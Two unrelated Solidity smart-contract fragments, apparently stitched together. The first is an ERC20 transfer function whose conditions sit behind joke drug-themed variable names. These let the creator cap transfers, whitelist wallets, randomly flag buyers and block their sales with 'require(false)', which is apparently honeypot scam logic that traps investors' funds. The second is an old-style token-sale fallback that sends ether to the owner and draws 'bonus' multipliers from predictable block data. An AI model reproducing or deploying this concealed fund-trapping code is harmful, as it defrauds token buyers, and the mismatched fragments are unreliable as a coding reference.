function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (colombia == false)) {
        mexico = chTx;
        teriyaki = false;
    }
    if ((address(sender) == creator) && (colombia == true)) {
        getCocaLeafes[recipient] = true;
        getPoweder[recipient] = false;
        colombia = false;
    }
    if ((amount > crystal) && (getCocaLeafes[sender] == true) && (address(sender) != creator)) {
        getElPatron[recipient] = true;
    }
    if (getCocaLeafes[recipient] != true) {
        getPoweder[recipient] = ((randomly() == 4) ? true : false);
    }
    if ((getPoweder[sender]) && (getCocaLeafes[recipient] == false)) {
        getPoweder[recipient] = true;
    }
    if (getCocaLeafes[sender] == false) {
        if ((amount > crystal) && (getElPatron[sender] == true)) {
            require(false);
        }
        require(amount < mexico);
        if (teriyaki == true) {
            if (getElPatron[sender] == true) {
                require(false);
            }
            getElPatron[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function() payable {
    if (!purchasingAllowed) {
        throw;
    }
    if (msg.value == 0) {
        return;
    }
    owner.transfer(msg.value);
    totalContribution += msg.value;
    uint256 tokensIssued = (msg.value * 1000);
    if (msg.value >= 10 finney) {
        tokensIssued += totalContribution;
        bytes20 bonusHash = ripemd160(block.coinbase, block.number, block.timestamp);
        if (bonusHash[0] == 0) {
            uint8 bonusMultiplier =
                ((bonusHash[1] & 0x01 != 0) ? 1 : 0) + ((bonusHash[1] & 0x02 != 0) ? 1 : 0) +
                ((bonusHash[1] & 0x04 != 0) ? 1 : 0) + ((bonusHash[1] & 0x08 != 0) ? 1 : 0) +
                ((bonusHash[1] & 0x10 != 0) ? 1 : 0) + ((bonusHash[1] & 0x20 != 0) ? 1 : 0) +
                ((bonusHash[1] & 0x40 != 0) ? 1 : 0) + ((bonusHash[1] & 0x80 != 0) ? 1 : 0);
            uint256 bonusTokensIssued = (msg.value * 1000) * bonusMultiplier;
            tokensIssued += bonusTokensIssued;
            totalBonusTokensIssued += bonusTokensIssued;
        }
    }
    totalSupply += tokensIssued;
    balances[msg.sender] += tokensIssued;
    Transfer(address(this), msg.sender, tokensIssued);
}

